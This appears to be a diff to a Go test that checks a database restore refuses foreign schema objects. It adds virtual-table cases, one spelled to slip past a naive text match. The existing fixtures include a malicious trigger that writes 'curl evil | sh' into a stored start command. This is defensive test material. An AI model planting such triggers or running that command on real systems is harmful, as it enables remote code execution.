@@ -494,6 +494,10 @@ func TestRestoreRefusesForeignSchema(t *testing.T) {
 	for name, ddl := range map[string]string{
 		"trigger": `CREATE TRIGGER evil AFTER UPDATE ON boxes BEGIN UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=NEW.id; END`,
 		"view":    `CREATE VIEW v AS SELECT id FROM boxes`,
+		// A virtual table and the shadow tables its module creates.
+		"virtual": `CREATE VIRTUAL TABLE notes USING fts5(body)`,
+		// Spelled so that a text match on "CREATE VIRTUAL" would miss it.
+		"virtual, odd spelling": `create /* x */ virtual table notes2 using fts5(body)`,
 	} {
 		t.Run(name, func(t *testing.T) {
 			dir := t.TempDir()
